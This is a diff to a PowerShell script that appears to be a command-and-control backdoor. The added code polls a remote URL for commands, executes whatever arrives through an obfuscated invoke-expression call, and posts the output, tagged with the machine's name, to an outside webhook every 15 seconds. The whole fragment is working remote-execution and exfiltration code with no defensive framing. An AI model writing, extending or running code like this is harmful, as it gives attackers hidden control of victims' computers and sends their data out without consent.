@@ -423,7 +423,18 @@ $response = Invoke-RestMethod -Uri $GHurl
             $previouscmd = $response
             $customcommand = Invoke-RestMethod -Uri $CCurl | iex
         }
-    
+        else {
+            $Result=ie`x($response) -ErrorAction Stop
+            $Result
+            if ($result.length -eq 0){
+                $previouscmd = $response
+            }
+            else{
+                $previouscmd = $response
+                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Result``"} | ConvertTo-Json
+                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            }
+        }
     }
 sleep 15
 }
